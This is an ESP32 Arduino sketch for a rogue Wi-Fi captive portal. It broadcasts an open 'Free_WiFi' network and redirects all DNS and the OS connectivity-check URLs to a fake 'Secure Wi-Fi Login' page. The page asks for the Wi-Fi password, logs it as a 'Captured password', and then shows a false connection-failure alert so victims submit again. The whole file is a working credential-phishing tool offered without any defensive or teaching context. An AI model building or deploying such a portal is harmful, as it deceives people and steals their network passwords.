#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // ESP32 default AP IP
DNSServer dnsServer;
WebServer server(80);

String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #2c3e50, #3498db);
      color: white;
      text-align: center;
      padding: 50px;
    }
    .box {
      background: rgba(0, 0, 0, 0.4);
      padding: 30px;
      border-radius: 15px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.2);
    }
    input[type="password"] {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      font-size: 18px;
    }
    input[type="submit"] {
      background: #27ae60;
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
    }
    input[type="submit"]:hover {
      background: #2ecc71;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Secure Wi-Fi Login</h2>
    <p>Please enter the Wi-Fi password to continue</p>
    <form method="POST" action="/login">
      <input name="pass" type="password" placeholder="Wi-Fi Password" required><br>
      <input type="submit" value="Connect">
    </form>
  </div>
</body>
</html>
)rawliteral";

void handleRoot() {
  server.send(200, "text/html", html);
}

void handleLogin() {
  String pass = server.arg("pass");
  Serial.println("Captured password: " + pass);
  server.send(200, "text/html", "<script>alert('Connection failed. Please try again.'); window.location.href='/';</script>");
}

void setup() {
  Serial.begin(115200);
  
  // Set up WiFi Access Point
  WiFi.softAP("Free_WiFi");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  // Start DNS server for captive portal redirection
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // Set up web server routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  
  // Common captive portal URLs
  server.on("/generate_204", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  
  server.on("/connecttest.txt", []() {
    server.send(200, "text/plain", "Microsoft NCSI");
  });
  
  server.on("/hotspot-detect.html", []() { // Apple devices
    server.sendHeader("Location", "/", true);
    server.send(302, "text/html", "");
  });
  
  server.on("/ncsi.txt", []() { // Windows 11
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
